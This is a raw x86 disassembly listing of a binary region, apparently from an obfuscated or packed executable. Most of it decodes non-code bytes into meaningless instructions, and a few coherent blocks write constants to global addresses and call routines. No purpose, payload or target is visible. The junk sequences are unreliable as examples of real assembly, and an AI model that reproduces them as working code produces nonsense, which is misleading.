  40a4e8:	mov    BYTE PTR [ecx+0x56aded52],al
  40a4ee:	dec    edx
  40a4ef:	or     cl,bh
  40a4f1:	aaa    
  40a4f2:	mov    eax,ds:0xe5f84273
  40a4f7:	push   ss
  40a4f8:	jge    0x40a55e
  40a4fa:	repnz daa 
  40a4fc:	and    eax,edx
  40a4fe:	sar    DWORD PTR [ecx],cl
  40a500:	inc    esp
  40a501:	aas    
  40a502:	push   ecx
  40a503:	cmp    BYTE PTR [edi+0x72534fba],bh
  40a509:	adc    DWORD PTR [ebp-0x68],0xbac80df4
  40a510:	enter  0x4caa,0x47
  40a514:	pop    ds
  40a515:	add    ecx,0xffffff91
  40a518:	vshufps xmm5,xmm0,XMMWORD PTR [ecx+0x53c40edb],0x48
  40a521:	mov    DWORD PTR [esi+0x46],0x71739113
  40a528:	mov    bl,0x5a
  40a52a:	xor    DWORD PTR [ebp+ebx*8+0x6683da3d],0x2cec5bcf
  40a535:	ja     0x40a4e3
  40a537:	fstp   QWORD PTR fs:[ebx]
  40a53a:	data16 and bh,BYTE PTR [esi+eax*1-0x48918821]
  40a542:	mov    eax,0x5639e5f2
  40a547:	outs   dx,BYTE PTR ds:[esi]
  40a548:	popa   
  40a549:	or     dl,al
  40a54b:	xor    DWORD PTR [ebx-0x10],edx
  40a54e:	bound  edi,QWORD PTR [ecx-0x1b11b31]
  40a554:	es mov esi,0xa6075278
  40a55a:	dec    esi
  40a55b:	loopne 0x40a53f
  40a55d:	aad    0x58
  40a55f:	loop   0x40a52b
  40a561:	(bad)  
  40a562:	xchg   esi,eax
  40a563:	iret   
  40a564:	rcr    ebx,0x31
  40a567:	dec    esi
  40a568:	mov    al,0x65
  40a56a:	int    0xf
  40a56c:	sbb    cl,BYTE PTR [esi+0x37de0971]
  40a572:	jmp    0x981e1733
  40a577:	scas   eax,DWORD PTR es:[edi]
  40a578:	maxps  xmm6,XMMWORD PTR [edi-0x1feb8da5]
  40a57f:	sbb    BYTE PTR [esi+0x2a911429],0x35
  40a586:	xchg   edx,eax
  40a587:	rcl    BYTE PTR [esi-0x18febfe8],1
  40a58d:	fist   DWORD PTR [ebx]
  40a58f:	rcl    ah,cl
  40a591:	sbb    DWORD PTR [edx+0x59],ecx
  40a594:	gs pusha 
  40a596:	sub    eax,0xfffffffe
  40a599:	dec    sp
  40a59b:	jns    0x40a5af
  40a59d:	rol    DWORD PTR [edx],1
  40a59f:	adc    eax,0x82ca37cb
  40a5a4:	ds cmp eax,0x37f0208f
  40a5aa:	imul   ecx,eax,0xffffff96
  40a5ad:	jmp    0x40a60b
  40a5af:	cld    
  40a5b0:	xor    bl,BYTE PTR [eax-0x37]
  40a5b3:	jge    0x40a5cc
  40a5b5:	add    ebp,esi
  40a5b7:	loope  0x40a58b
  40a5b9:	daa    
  40a5ba:	mov    edi,0x7c003b99
  40a5bf:	add    eax,0x91a215d4
  40a5c4:	push   0xbae3f6db
  40a5c9:	xor    DWORD PTR [eax+0x75],0xfffffff7
  40a5cd:	cmp    BYTE PTR [edi+0x48f37bb7],ah
  40a5d3:	sbb    ebp,eax
  40a5d5:	clc    
  40a5d6:	bound  ebx,QWORD PTR [edi+0x27]
  40a5d9:	adc    al,0x5
  40a5db:	fstp   TBYTE PTR [ebx-0x2c5e2188]
  40a5e1:	and    ebx,ebp
  40a5e3:	or     eax,0x52738e27
  40a5e8:	jmp    0xbeae935b
  40a5ed:	pop    DWORD PTR [ebx]
  40a5ef:	pop    ebx
  40a5f0:	call   0xcab75917
  40a5f5:	mov    ah,0x35
  40a5f7:	stos   DWORD PTR es:[edi],eax
  40a5f8:	test   eax,0x431998c6
  40a5fd:	(bad)  
  40a5fe:	mov    dh,0x39
  40a600:	(bad)  
  40a602:	test   DWORD PTR [edi],0x1c6d3ca8
  40a608:	pop    edi
  40a609:	inc    ecx
  40a60a:	xor    BYTE PTR [ebx],ah
  40a60c:	pushf  
  40a60d:	xor    eax,0xabf69930
  40a612:	and    DWORD PTR [edi+0x212c00a3],esi
  40a618:	xor    al,0xcb
  40a61a:	rol    DWORD PTR [edi+0x94f1428],1
  40a620:	retf   
  40a621:	mov    esi,0xe8968936
  40a626:	xor    eax,0x28edf0ef
  40a62b:	jg     0x40a5e2
  40a62d:	mov    esp,0x220dbd80
  40a632:	push   eax
  40a633:	stos   BYTE PTR es:[edi],al
  40a634:	(bad)  
  40a636:	gs jo  0x40a5ea
  40a639:	(bad)  
  40a63a:	in     eax,dx
  40a63b:	popf   
  40a63c:	cmc    
  40a63d:	inc    ebp
  40a63e:	mov    al,0x2b
  40a640:	test   DWORD PTR [ecx],0x388f374c
  40a646:	jle    0x40a66c
  40a648:	or     DWORD PTR [edi+ecx*8+0x41],0xdc6adbb8
  40a650:	into   
  40a651:	adc    eax,0x4e61c8f8
  40a656:	clc    
  40a657:	pop    ebp
  40a658:	call   0x2b8feee9
  40a65d:	inc    ebx
  40a65e:	sbb    eax,0x14ef471e
  40a663:	dec    ebx
  40a664:	add    esp,DWORD PTR [ecx]
  40a666:	psubd  mm7,QWORD PTR [esi+0x0]
  40a66a:	fst    QWORD PTR [edx+0x51411f53]
  40a670:	xchg   eax,esp
  40a672:	(bad)  
  40a674:	and    al,0xe3
  40a676:	retf   0xa10
  40a679:	std    
  40a67a:	mov    edx,0x5222d3fb
  40a67f:	jno    0x40a60d
  40a681:	and    esi,edx
  40a683:	fsubr  QWORD PTR [esi+0x3b]
  40a686:	fwait
  40a687:	pop    eax
  40a688:	sbb    al,0xc8
  40a68a:	lea    ecx,[ebx-0x1e6e9afb]
  40a690:	ret    0x4208
  40a693:	xor    al,0xdc
  40a695:	xor    dh,BYTE PTR [ebx]
  40a697:	mov    ah,0xc5
  40a699:	adc    eax,DWORD PTR [edi]
  40a69b:	push   ss
  40a69c:	push   cs
  40a69d:	push   es
  40a69e:	mov    ebp,0x9831d0d9
  40a6a3:	and    BYTE PTR [esi+0x23f64220],dh
  40a6a9:	jge    0x40a6ef
  40a6ab:	cmp    DWORD PTR [edi+0x4d07e3ae],0x89b34590
  40a6b5:	add    eax,0x3646d99a
  40a6ba:	xchg   esp,eax
  40a6bb:	mov    ecx,edx
  40a6bd:	push   ebx
  40a6be:	ja     0x40a734
  40a6c0:	icebp  
  40a6c1:	icebp  
  40a6c2:	pop    ss
  40a6c3:	or     eax,0x591a7af0
  40a6c8:	das    
  40a6c9:	pop    ebx
  40a6ca:	loopne 0x40a720
  40a6cc:	jecxz  0x40a65f
  40a6ce:	push   edx
  40a6cf:	cwde   
  40a6d0:	or     edi,DWORD PTR [ebx]
  40a6d2:	enter  0xbce7,0xc9
  40a6d6:	pop    ebx
  40a6d7:	xor    DWORD PTR [esi],esp
  40a6d9:	out    0x25,al
  40a6db:	cdq    
  40a6dc:	fdiv   QWORD PTR [eax]
  40a6de:	or     ch,dh
  40a6e0:	sub    eax,0xee063e9e
  40a6e5:	inc    edx
  40a6e6:	fcmove st,st(5)
  40a6e8:	and    al,0x9b
  40a6ea:	out    0x52,al
  40a6ec:	inc    ecx
  40a6ed:	cmp    edi,eax
  40a6ef:	mov    DWORD PTR ds:0x43366b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433657,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4336e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433717
  40a72f:	or     DWORD PTR ds:0x433723,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433713,0x433607
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4336af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433667,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4336ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4335ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4336db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43360b
  40a793:	sub    DWORD PTR ds:0x433623,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0x5150ec0c
  40a7ac:	icebp  
  40a7ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	sub    al,0x2e
  40a7b8:	in     al,0x3a
  40a7ba:	aad    0x4f
  40a7bc:	jno    0x40a815
  40a7be:	push   0x33
  40a7c0:	mov    ds:0xd65d20c9,al
  40a7c5:	xchg   DWORD PTR [ecx+esi*2+0x3065f566],esp
  40a7cc:	stos   BYTE PTR es:[edi],al
  40a7cd:	aas    
  40a7ce:	mov    ds:0x3a741558,eax
  40a7d3:	fdiv   st(2),st
  40a7d5:	leave  
  40a7d6:	mov    bh,0xab
  40a7d8:	std    
  40a7d9:	mov    edx,0x1a01ec30
  40a7de:	fistp  WORD PTR [edx]
  40a7e0:	add    ebx,DWORD PTR [eax+eiz*8-0x688451c7]
  40a7e7:	adc    BYTE PTR [esi],cl
  40a7e9:	mov    bh,0x75
  40a7eb:	das    
  40a7ec:	out    0x2a,eax
  40a7ee:	cmp    eax,0x2dd4778c
  40a7f3:	int3   
  40a7f4:	push   cs
  40a7f5:	lds    esi,FWORD PTR [ebx+0x46]
  40a7f8:	cmp    ecx,edi
  40a7fa:	pop    edi
  40a7fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7fc:	hlt    
  40a7fd:	push   ecx
  40a7fe:	fld    TBYTE PTR [ebx-0x40]
  40a801:	retf   0x9bfa
  40a804:	mov    cl,0xc1
  40a806:	xchg   ecx,eax
  40a807:	es scas al,BYTE PTR es:[edi]
  40a809:	cmp    DWORD PTR [ebp+0x8a1fd0f],edx
  40a80f:	(bad)  
  40a810:	int    0x3b
  40a812:	mov    edx,0xf9512f05
  40a817:	in     al,dx
  40a818:	ret    
  40a819:	popa   
  40a81a:	push   esp
  40a81b:	bound  esp,QWORD PTR [esi]
  40a81d:	mov    esi,0x9430e772
  40a822:	scas   eax,DWORD PTR es:[edi]
  40a823:	jecxz  0x40a891
  40a825:	test   al,0x0
  40a827:	bound  ebp,QWORD PTR [eax]
  40a829:	inc    eax
  40a82a:	sbb    eax,DWORD PTR [ebx]
  40a82c:	test   DWORD PTR [ebx+0x10],edx
  40a82f:	push   edx
  40a830:	pop    esi
  40a831:	lods   eax,DWORD PTR ds:[esi]
  40a832:	ins    DWORD PTR es:[edi],dx
  40a833:	cmp    DWORD PTR [ecx-0x41],esi
  40a836:	das    
  40a837:	mov    eax,eax
  40a839:	sbb    ah,BYTE PTR ds:0x16d3966d
  40a83f:	aad    0x64
  40a841:	mov    ah,0x9f
  40a843:	mov    ecx,0x5709b728
  40a848:	ret    
  40a849:	inc    DWORD PTR [ebp-0x3419a064]
  40a84f:	xor    al,BYTE PTR [edx]
  40a851:	mov    esi,0x6af9fec0
  40a856:	sbb    ebx,DWORD PTR [ebx+ebx*2+0x452eacb2]
  40a85d:	scas   eax,DWORD PTR es:[edi]
  40a85e:	in     al,dx
  40a85f:	(bad)  [ebp-0x28]
  40a862:	stos   BYTE PTR es:[edi],al
  40a863:	and    DWORD PTR [esi+0x5e],0x27e893ba
  40a86a:	int3   
  40a86b:	out    dx,eax
  40a86c:	adc    eax,DWORD PTR cs:[eax-0x6540a4ef]
  40a873:	or     ebp,DWORD PTR [eax+0x6e5e5211]
  40a879:	cld    
  40a87a:	dec    esi
  40a87b:	add    dl,BYTE PTR [ecx-0x4c862d25]
  40a881:	mov    edx,DWORD PTR [eax+0x6045eb13]
  40a887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a888:	int3   
  40a889:	push   ds
  40a88a:	dec    edi
  40a88b:	rol    BYTE PTR [esi+0x15358b0e],1
  40a891:	dec    esi
  40a892:	xchg   ebp,eax
  40a893:	xlat   BYTE PTR ds:[ebx]
  40a894:	lock jmp 0x40a81f
  40a897:	mov    esp,0xf16d58b6
  40a89c:	or     BYTE PTR [edi+0x4e],ah
  40a89f:	dec    eax
  40a8a0:	icebp  
  40a8a1:	mov    dl,0x93
  40a8a3:	pop    edx
  40a8a4:	mov    ebp,0x632d6275
  40a8a9:	ret    
  40a8aa:	jp     0x40a8e9
  40a8ac:	out    0x30,eax
  40a8ae:	(bad)  [esp+edi*2]
  40a8b1:	popf   
  40a8b2:	push   es
  40a8b3:	cmp    dl,dh
  40a8b5:	and    DWORD PTR ds:0x8118f350,esp
  40a8bb:	retf   
  40a8bc:	into   
  40a8bd:	test   ax,0x33d1
  40a8c1:	mov    BYTE PTR [edi-0x67b07caa],dl
  40a8c7:	jae    0x40a869
  40a8c9:	out    0x26,al
  40a8cb:	inc    ebx
  40a8cc:	dec    edi
  40a8cd:	xchg   edi,eax
  40a8ce:	in     al,0x11
  40a8d0:	sbb    al,0xac
  40a8d2:	xchg   esi,eax
  40a8d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8d4:	pop    ebp
  40a8d5:	sub    eax,0xea365e91
  40a8da:	jmp    0xf86de386
  40a8df:	(bad)  [edi+0x6abd0686]
  40a8e5:	ds inc edx
  40a8e7:	fbstp  TBYTE PTR [esi]
  40a8e9:	push   eax
  40a8ea:	jmp    0x40a914
  40a8ec:	cwde   
  40a8ed:	pop    ebx
  40a8ee:	stc    
  40a8ef:	adc    eax,DWORD PTR [eax]
  40a8f1:	sub    eax,0xa1bbf9e
  40a8f6:	push   edi
  40a8f7:	dec    eax
  40a8f8:	repnz or bh,BYTE PTR [ecx+eax*8+0x58]
  40a8fd:	aam    0xad
  40a8ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a900:	xchg   ebx,eax
  40a901:	(bad)  
  40a902:	ja     0x40a8fa
  40a904:	adc    eax,0x82b0ea91
  40a909:	clc    
  40a90a:	cmp    ecx,DWORD PTR [edi]
  40a90c:	outs   dx,DWORD PTR ds:[esi]
  40a90d:	xchg   esi,ecx
  40a90f:	fdivr  QWORD PTR [edi-0x206a2aa1]
  40a915:	fsubr  QWORD PTR [eax+0x31]
  40a918:	mov    DWORD PTR [esi-0x16],0x43ee4e52
  40a91f:	mov    ebx,0xffc3c5c8
  40a924:	aas    
  40a925:	push   eax
  40a926:	mov    edx,0xc6e75945
  40a92b:	icebp  
  40a92c:	xchg   DWORD PTR [edx-0x1],eax
  40a92f:	push   eax
  40a930:	inc    ecx
  40a931:	bound  esp,QWORD PTR [ebx-0x242f6272]
  40a937:	outs   dx,DWORD PTR ds:[esi]
  40a938:	fisub  WORD PTR ss:[esi+0x1f]
  40a93c:	pop    ds
  40a93d:	sub    al,BYTE PTR [edi-0x2a99880f]
  40a943:	cmp    al,ah
  40a945:	test   al,0xee
  40a947:	les    ecx,FWORD PTR [ecx]
  40a949:	ins    DWORD PTR es:[edi],dx
  40a94a:	pop    ecx
  40a94b:	rol    DWORD PTR [ecx],1
  40a94d:	in     eax,dx
  40a94e:	aam    0xe6
  40a950:	loope  0x40a9a5
  40a952:	mov    DWORD PTR [esi],esp
  40a954:	mov    ds:0x74c64999,eax
  40a959:	(bad)  
  40a95a:	mov    ah,0x2
  40a95c:	push   cs
  40a95d:	push   0x30978a1c
  40a962:	push   esp
  40a963:	jmp    0xd70d:0x266ef45d
  40a96a:	mov    ch,0xaa
  40a96c:	stos   BYTE PTR es:[edi],al
  40a96d:	pop    eax
  40a96e:	and    BYTE PTR [edi],cl
  40a970:	and    DWORD PTR [ecx+eiz*8-0x45],esi
  40a974:	jle    0x40a9a2
  40a976:	out    dx,eax
  40a977:	repnz mov edi,0x3f45c194
  40a97d:	fs iret 
  40a97f:	into   
  40a980:	outs   dx,BYTE PTR ds:[esi]
  40a981:	scas   al,BYTE PTR es:[edi]
  40a982:	imul   ecx,DWORD PTR [ebx-0x5a6788dd],0x5fd7aaf9
  40a98c:	test   DWORD PTR [ebp-0x62749bee],0x3175a544
  40a996:	xor    ebp,eax
  40a998:	push   ecx
  40a999:	dec    esp
  40a99a:	push   0x5b
  40a99c:	ins    BYTE PTR es:[edi],dx
  40a99d:	int    0x33
  40a99f:	ret    0x6054
  40a9a2:	adc    cl,BYTE PTR [ebx]
  40a9a4:	nop
  40a9a5:	arpl   bx,dx
  40a9a7:	jle    0x40a9ab
  40a9a9:	or     esp,DWORD PTR [eax-0x79]
  40a9ac:	out    0x38,eax
  40a9ae:	and    cl,dl
  40a9b0:	push   edi
  40a9b1:	popa   
  40a9b2:	les    eax,FWORD PTR [edi+0x51]
  40a9b5:	scas   al,BYTE PTR es:[edi]
  40a9b6:	pop    ebp
  40a9b7:	sub    ch,BYTE PTR [edx+edi*8]
  40a9ba:	cs jl  0x40aa1a
  40a9bd:	ret    
  40a9be:	sub    al,0x45
  40a9c0:	push   esp
  40a9c1:	(bad)  
  40a9c2:	sub    esp,eax
  40a9c4:	pop    ebx
  40a9c5:	jl     0x40a957
  40a9c7:	call   0xea7422c8
  40a9cc:	shl    DWORD PTR [ebx-0x13],0xaf
  40a9d0:	(bad)  
  40a9d1:	es add dh,dl
  40a9d4:	push   ebp
  40a9d5:	rcl    BYTE PTR [esi+0xe],cl
  40a9d8:	or     BYTE PTR [edx-0x69530e8],0x94
  40a9df:	(bad)  
  40a9e1:	jno    0x40a99f
  40a9e3:	jne    0x40aa31
  40a9e5:	pop    edi
  40a9e6:	or     DWORD PTR [edi],0x4f372218
  40a9ec:	cmp    DWORD PTR [ebx-0x62793945],ecx
  40a9f2:	jb     0x40aa1b
  40a9f4:	sub    al,0xb6
  40a9f6:	push   edx
  40a9f7:	ficomp WORD PTR [edi-0x7699507d]
  40a9fd:	inc    ebp
  40a9fe:	in     al,dx
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433617,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433717,0x4336e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433667,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	jns    0x40aa4a
  40aa36:	xchg   edi,eax
  40aa37:	ins    BYTE PTR es:[edi],dx
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	cmp    al,BYTE PTR [ebp*2+0x46175ff2]
  40aa47:	xchg   ecx,eax
  40aa48:	fist   WORD PTR [ebx+0x24]
  40aa4b:	loopne 0x40aa17
  40aa4d:	jb     0x40a9fe
  40aa4f:	adc    DWORD PTR ds:0x2d9e44a2,eax
  40aa55:	mov    BYTE PTR [esp+edx*1],0xab
  40aa59:	loop   0x40a9ee
  40aa5b:	xor    eax,0x6a6b3437
  40aa60:	test   al,0xe1
  40aa62:	sbb    BYTE PTR [ebx+eiz*2],al
  40aa65:	mov    bl,0x28
  40aa67:	and    eax,0x8230c473
  40aa6c:	xor    BYTE PTR ds:0xf1fcbefb,0x93
  40aa73:	icebp  
  40aa74:	stos   BYTE PTR es:[edi],al
  40aa75:	xor    eax,ebx
  40aa77:	loopne 0x40aaaf
  40aa79:	fneni(8087 only) 
  40aa7b:	pop    DWORD PTR [eax-0x4b04c9a7]
  40aa81:	aas    
  40aa82:	mov    dl,0x3f
  40aa84:	test   al,0xb6
  40aa86:	cld    
  40aa87:	xchg   ecx,eax
  40aa88:	(bad)  
  40aa89:	js     0x40aa1a
  40aa8b:	mov    al,ds:0x359e0cea
  40aa90:	xchg   ebx,eax
  40aa91:	sub    DWORD PTR [edi-0x58467837],0xffffffaa
  40aa98:	xor    esp,DWORD PTR [esi]
  40aa9a:	add    BYTE PTR [edx+0x8b0a3d9],cl
  40aaa0:	in     al,0x47
  40aaa2:	inc    esi
  40aaa3:	mov    ds:0x5526ea57,al
  40aaa8:	push   esp
  40aaa9:	ja     0x40aada
  40aaab:	lock lods eax,DWORD PTR ds:[esi]
  40aaad:	lahf   
  40aaae:	jbe    0x40aa82
  40aab0:	adc    eax,0xd8a621de
  40aab5:	dec    edi
  40aab6:	jne    0x40ab01
  40aab8:	daa    
  40aab9:	maxps  xmm6,XMMWORD PTR [esi+0x2c665e6a]
  40aac0:	mov    ebx,0x38408829
  40aac5:	pusha  
  40aac6:	call   0xe703f41c
  40aacb:	(bad)  
  40aacd:	clc    
  40aace:	clc    
  40aacf:	loopne 0x40aae2
  40aad1:	shr    BYTE PTR [ecx],1
  40aad3:	pop    ebp
  40aad4:	sbb    DWORD PTR [ecx-0x5c9e33c4],ebx
  40aada:	mov    ebp,0x44589364
  40aadf:	dec    esp
  40aae0:	mov    edx,0x49c2c6e5
  40aae5:	aam    0x79
  40aae7:	push   ebp
  40aae8:	jmp    0x5ed540cd
  40aaed:	xor    eax,0xbd56db09
  40aaf2:	clc    
  40aaf3:	push   ecx
  40aaf4:	in     eax,0x58
  40aaf6:	test   BYTE PTR [ebx-0x34],0x8a
  40aafa:	ins    DWORD PTR es:[edi],dx
  40aafb:	add    esi,DWORD PTR [ebx-0x18f8c6fd]
  40ab01:	jnp    0x40ab41
  40ab03:	iret   
  40ab04:	xor    DWORD PTR [esi+0x36f761c9],0xffffffae
  40ab0b:	cmp    dh,BYTE PTR [edi]
  40ab0d:	dec    edi
  40ab0e:	test   ah,bh
  40ab10:	adc    dh,dl
  40ab12:	pop    ss
  40ab13:	push   esp
  40ab14:	inc    esi
  40ab15:	fild   QWORD PTR [esi-0x29]
  40ab18:	int3   
  40ab19:	xchg   DWORD PTR [ebp-0x3d],esp
  40ab1c:	pushf  
  40ab1d:	cmp    al,0x8b
  40ab1f:	std    
  40ab20:	pop    edi
  40ab21:	stc    
  40ab22:	fucomi st,st(1)
  40ab24:	leave  
  40ab25:	mov    ebx,0xa2e29c79
  40ab2a:	cmp    BYTE PTR [edx-0x1e5e5819],ch
  40ab30:	add    eax,ebx
  40ab32:	mov    cl,cl
  40ab34:	sub    dl,ah
  40ab36:	pop    eax
  40ab37:	mov    ebp,0xa090f01a
  40ab3c:	pop    ds
  40ab3d:	lods   al,BYTE PTR ds:[esi]
  40ab3e:	dec    eax
  40ab3f:	pushf  
  40ab40:	or     edx,ebp
  40ab42:	xor    dl,BYTE PTR [edi+0x7177a181]
  40ab48:	dec    edi
  40ab49:	jmp    0x436f:0xe9bcd851
  40ab50:	inc    DWORD PTR [eax+0x6c93312c]
  40ab56:	add    BYTE PTR [ebx-0x29b9adb7],bl
  40ab5c:	jb     0x40aafe
  40ab5e:	jge    0x40ab53
  40ab60:	xor    al,BYTE PTR [ecx]
  40ab62:	lds    ebp,FWORD PTR [edx+ebx*8]
  40ab65:	mov    cl,0x9c
  40ab67:	sub    al,0x42
  40ab69:	call   0x687fa372
  40ab6e:	sub    DWORD PTR [edi+0x5917e78f],0xd
  40ab75:	jne    0x40ab97
  40ab77:	cmp    BYTE PTR [eax+0x3e58221f],bl
  40ab7d:	xor    eax,esi
  40ab7f:	inc    eax
  40ab80:	and    al,0xed
  40ab82:	inc    edi
  40ab83:	sub    eax,0xf3d75128
  40ab88:	lods   al,BYTE PTR ds:[esi]
  40ab89:	sub    dh,BYTE PTR [ebp+0x12]
  40ab8c:	jne    0x40ab27
  40ab8e:	iret   
  40ab8f:	adc    BYTE PTR [eax-0x41],ch
  40ab92:	mov    bh,0xf1
  40ab94:	and    eax,0xfa5359f9
  40ab99:	sub    DWORD PTR [edx+esi*8-0x62a927bb],ebx
  40aba0:	cmc    
  40aba1:	sbb    eax,0x957cd081
  40aba7:	push   ebx
  40aba8:	mov    edi,0x850bff28
  40abad:	inc    esp
  40abae:	stos   DWORD PTR es:[edi],eax
  40abaf:	mov    eax,0xdb2932ba
  40abb4:	fistp  DWORD PTR [ecx]
  40abb6:	js     0x40aba6
  40abb8:	shl    DWORD PTR [edi+0x75],cl
  40abbb:	imul   esi,DWORD PTR [ebx-0x1],0x744674fc
  40abc2:	daa    
  40abc3:	shl    DWORD PTR [esi],0x95
  40abc6:	inc    ebp
  40abc7:	cmp    al,0x86
  40abc9:	mov    ebp,0x4ebfa10
  40abce:	in     eax,dx
  40abcf:	xchg   esi,eax
  40abd0:	dec    DWORD PTR ds:0x1147
  40abd5:	aam    0xa8
  40abd7:	pop    ecx
  40abd8:	dec    eax
  40abd9:	dec    edi
  40abda:	clc    
  40abdb:	jmp    0x40aba7
  40abdd:	jae    0x40ab85
  40abdf:	cmp    DWORD PTR [eax],esi
  40abe1:	(bad)  
  40abe2:	fs push esp
  40abe4:	jbe    0x40abc4
  40abe6:	xchg   edx,eax
  40abe7:	and    DWORD PTR [edi+0x571fdcdf],ecx
  40abed:	mov    cl,0x4e
  40abef:	call   edx
  40abf1:	aaa    
  40abf2:	mov    eax,0x7464eb1c
  40abf7:	sub    al,0x71
  40abf9:	fdivp  st(1),st
  40abfb:	mov    esp,DWORD PTR [eiz*8-0x1f5b4215]
  40ac02:	(bad)  
  40ac04:	cli    
  40ac05:	and    BYTE PTR [edi+0x293da6e8],dh
  40ac0b:	mov    ds:0x3919cbd9,eax
  40ac10:	loopne 0x40abb1
  40ac12:	mov    al,ds:0x741afd41
  40ac17:	xor    BYTE PTR [ecx+edx*8],0xee
  40ac1b:	push   0x37
  40ac1d:	dec    ecx
  40ac1e:	pop    esp
  40ac1f:	stos   BYTE PTR es:[edi],al
  40ac20:	push   edi
  40ac21:	mov    esi,0x6399b43b
  40ac26:	call   0x541f6b01
  40ac2b:	mov    dh,0xd1
  40ac2d:	pop    es
  40ac2e:	fmul   DWORD PTR [ebx+0x72]
  40ac31:	sub    edx,DWORD PTR [eax-0x60901f12]
  40ac37:	push   0x36
  40ac39:	repz push cs
  40ac3b:	out    dx,al
  40ac3c:	xchg   DWORD PTR [edi+0x2c204379],edi
  40ac42:	adc    DWORD PTR [ecx+ebp*8+0x27],ebp
  40ac46:	(bad)  
  40ac47:	loop   0x40ac4c
  40ac49:	dec    eax
  40ac4a:	fcmovnb st,st(7)
  40ac4c:	adc    DWORD PTR [ebx-0x17],ebx
  40ac4f:	hlt    
  40ac50:	mov    bl,0x28
  40ac52:	idiv   edx
  40ac54:	popf   
  40ac55:	imul   esi,DWORD PTR [ebx+0x3f295780],0xad39d0cf
  40ac5f:	push   ds
  40ac60:	test   DWORD PTR [ecx+eiz*1-0x7e],edi
  40ac64:	pop    edi
  40ac65:	mov    bh,0x79
  40ac67:	dec    al
  40ac69:	xchg   DWORD PTR [esi+0x29c04f1d],ebx
  40ac6f:	add    esi,ecx
  40ac71:	fisttp DWORD PTR [ebx]
  40ac73:	stos   BYTE PTR es:[edi],al
  40ac74:	xor    eax,0x5a1578d8
  40ac79:	jmp    0x40acc8
  40ac7b:	(bad)  
  40ac7c:	xchg   edi,eax
  40ac7d:	mov    esp,0xe8fe3cb7
  40ac82:	cmp    BYTE PTR [edx],bl
  40ac84:	dec    esi
  40ac85:	mov    ds:0x840fc83b,eax
  40ac8a:	pop    edi
  40ac8b:	or     eax,0x1d810000
  40ac90:	imul   esi,DWORD PTR [esi],0x43
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	out    dx,eax
  40ac9e:	ss inc ebx
  40aca0:	add    BYTE PTR [eax],al
  40aca2:	add    BYTE PTR [eax],al
  40aca4:	add    BYTE PTR [ebx],dh
  40aca6:	leave  
  40aca7:	or     ecx,DWORD PTR ds:0x4336ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4336ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4336ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433788
  40acc6:	push   0x4337cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4336ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4336ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4336ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4336ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43369f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0x36ec633],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad74
  40ad2c:	mov    al,ds:0x29ee2b90
  40ad31:	enter  0x26f6,0xcb
  40ad35:	jb     0x40ace1
